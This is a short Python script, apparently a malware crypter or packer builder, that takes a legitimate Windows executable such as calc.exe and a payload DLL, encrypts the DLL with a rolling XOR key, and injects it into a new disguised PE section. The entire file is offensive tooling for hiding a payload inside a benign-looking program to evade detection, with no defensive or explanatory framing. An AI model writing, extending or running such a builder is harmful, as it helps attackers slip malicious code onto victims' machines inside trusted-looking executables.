import pefile
import os
import secrets

def build_ghost_carrier(shell_exe, payload_dll, output_name):
    # 1. Load the legit shell (e.g., calc.exe)
    pe = pefile.PE(shell_exe)
    
    with open(payload_dll, "rb") as f:
        dll_data = f.read()

    # 2. Rolling XOR Encryption (The Level Up)
    key = secrets.token_bytes(16)
    encrypted_payload = bytearray()
    prev = 0xAA
    for i in range(len(dll_data)):
        val = dll_data[i] ^ key[i % 16] ^ prev
        encrypted_payload.append(val)
        prev = val
    
    # Store Key + Encrypted Data
    final_blob = key + encrypted_payload

    # 3. PE Section Injection
    file_align = pe.OPTIONAL_HEADER.FileAlignment
    sect_align = pe.OPTIONAL_HEADER.SectionAlignment
    last_sect = pe.sections[-1]
    
    new_raw_offset = (last_sect.PointerToRawData + last_sect.SizeOfRawData)
    new_va = (last_sect.VirtualAddress + (last_sect.Misc_VirtualSize + sect_align - 1) // sect_align * sect_align)

    new_section = pefile.SectionStructure(pe.__IMAGE_SECTION_HEADER_format__, pe=pe)
    new_section.Name = b".rsac\x00\x00\x00"
    new_section.Misc_VirtualSize = len(final_blob)
    new_section.VirtualAddress = new_va
    new_section.SizeOfRawData = (len(final_blob) + file_align - 1) // file_align * file_align
    new_section.PointerToRawData = new_raw_offset
    new_section.Characteristics = 0x40000040 # Read | Initialized Data

    pe.sections.append(new_section)
    pe.FILE_HEADER.NumberOfSections += 1
    
    # 4. Save and Append Data
    out_data = pe.write()
    # Padding to ensure the blob starts at the correct Raw Offset
    out_data = out_data + (b'\x00' * (new_raw_offset - len(out_data))) + final_blob
    
    with open(output_name, "wb") as f:
        f.write(out_data)
    print(f"[+] '{output_name}' built successfully with rolling XOR encryption.")
